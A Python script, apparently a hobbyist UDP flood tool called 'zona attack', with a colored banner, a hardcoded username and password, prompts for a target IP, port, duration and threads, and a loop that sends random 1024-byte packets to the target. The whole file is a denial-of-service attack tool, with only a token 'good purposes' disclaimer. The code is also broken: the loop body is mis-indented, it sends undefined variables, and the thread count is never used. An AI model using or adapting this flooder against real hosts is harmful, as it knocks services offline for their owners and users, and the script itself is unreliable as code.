# -*- coding: utf-8 -*-
import random
import socket
import threading
import os
import sys
import time
import fade
os.system("clear")

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1024)
#############

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    ZA1 = '\033[31m'
    ZA2 = '\033[32m'
    ZA3 = '\033[33m'
    FAIL = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    ZH = '\033[97m'

attemps = 0
os.system("clear")
print("")
print("\033[95m        @       @   @   @     @ @ @ @ @ @ @  @ @ @ @ @       \033[0m")
print("\033[95m        @     @     @   @      @         @          @        \033[0m")
print("\033[95m        @   @       @   @       @       @          @         \033[0m")
print("\033[31m        @ @         @   @        @     @          @          \033[0m")
print("\033[31m        @  @        @   @         @   @          @           \033[0m")   
print("\033[31m        @    @      @   @          @ @          @            \033[0m")
print("\033[31m        @      @    @   @ @ @ @ @   @          @ @ @ @ @     \033[0m")
print("")     
print("\033[91m            @ @ @       @ @    @         @   @     @         \033[0m")
print("\033[91m            @     @   @     @  @         @     @   @         \033[0m")
print("\033[94m            @ @ @     @     @  @         @       @ @         \033[0m")
print("\033[94m            @     @   @ @ @ @  @         @     @   @         \033[0m")
print("\033[94m            @ @ @     @     @  @ @ @ @   @   @     @         \033[0m")              
print("\033[94m_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_\033[0m")
print("\033[95m             SHOULD ONLY BE USED FOR GOOD PURPOSES               \033[0m")
print("\033[94m—_—_—_—_—_—_—_—_—_—_—_—_—_——_—_—_—_—_—_—_—_—_—_—_—_—_—_——_—_—_—__\033[0m")
while attemps < 100:
    username = input('\033[33mEnter your username: \033[0m')
    password = input('\033[94mEnter your password: \033[0m')

    if username == 'k0l4pz' and password == 'k0l4pz':
        print('welcome to zona attack!!')
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue


ip = str(input("\033[94mTarget IP :  \033[0m"))
port = int(input("\033[97mTarget Port :  \033[0m"))
choice = str(input("\033[31m(y/n) :  \033[0m"))
times = int(input("\033[96mTime : \033[0m"))
threads = int(input("\033[92mThreads :  \033[0m"))
time.sleep(5),
print("\033[96m               ⟩⟩  Minus 5 \033[0m "),
time.sleep(5),
print("\033[92m               ⟩⟩  Minus 4 \033[0m "),
time.sleep(5),
print("\033[1m               ⟩⟩  Minus 3 \033[0m "),
time.sleep(5),
print("\033[97m               ⟩⟩  Minus 2 \033[0m "),
time.sleep(5),
print("\033[95m               ⟩⟩  Minus 1 \033[0m "),
time.sleep(5),
print("\033[92m               ⟩⟩  G0....!! \033[0m "),
time.sleep(5),

def run():
i = random.choice(("[+]"))
while True:
	try:
	    addr = (str(ip),int(port))
	    for x in range(times):
		s.sendto(data,addr)
		print("\033[95m[\033[97m+\033[95m] \033[91mRequest Attack  :. " +ip+ " \033[0m")
	except:
		print("\033[33m[\033[95m!\033[33m] Error!")

